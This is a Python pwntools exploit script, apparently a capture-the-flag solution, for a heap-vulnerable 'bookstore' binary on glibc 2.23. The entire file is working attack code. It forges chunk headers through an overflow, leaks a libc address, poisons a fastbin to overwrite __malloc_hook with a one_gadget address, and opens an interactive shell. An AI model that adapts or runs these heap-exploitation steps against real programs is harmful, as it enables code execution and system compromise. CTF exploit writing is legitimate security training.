from pwn import *
from change_ld import *

context.log_level = "debug"
context.terminal = ["terminator","-e"]

bin = change_ld("bookstore","ld-2.23.so")
libc = bin.libc
p = bin.process()

def Debug():
    gdb.attach(p)
    pause()

def add(size,book):
    p.sendlineafter("Your choice:\n","1")
    p.sendlineafter("name?\n","syclover")
    p.sendlineafter("name?\n",str(size))
    p.sendlineafter("book?\n",book)

def sell(idx):
    p.sendlineafter("Your choice:\n","2")
    p.sendlineafter("sell?\n",str(idx))

def read(idx):
    p.sendlineafter("Your choice:\n","3")
    p.sendlineafter("sell?\n",str(idx))

add(0,"")#0
add(0x48,"")#1
add(0x48,"")#2
add(0x48,"")#3
sell(0)
add(0,cyclic(0x10)+p64(0)+p64(0xa1))
sell(1)
add(0x48,"")
read(2)
p.recvuntil("Bookname:")
libc.address = u64(p.recv(6)+"\x00"*2)-0x19eb78
success("libc.address-->"+hex(libc.address))

add(0,"")#4
add(0x38,"")#5
sell(3)
sell(4)
sell(5)
add(0,p64(0)*9+p64(0x50)+p64(libc.address+0x19eb30)+p64(0)*8+p64(0x41)+p64(0x50))#4
add(0x38,"")#4
add(0x48,"")
add(0x48,"\x00"*0x38+p64(libc.sym["__malloc_hook"]-0x10))
add(0x48,p64(libc.address+0x40952)*2)
p.sendlineafter("Your choice:\n","1")
p.sendlineafter("name?\n","syclover")
p.sendlineafter("name?\n",str(1))
p.interactive()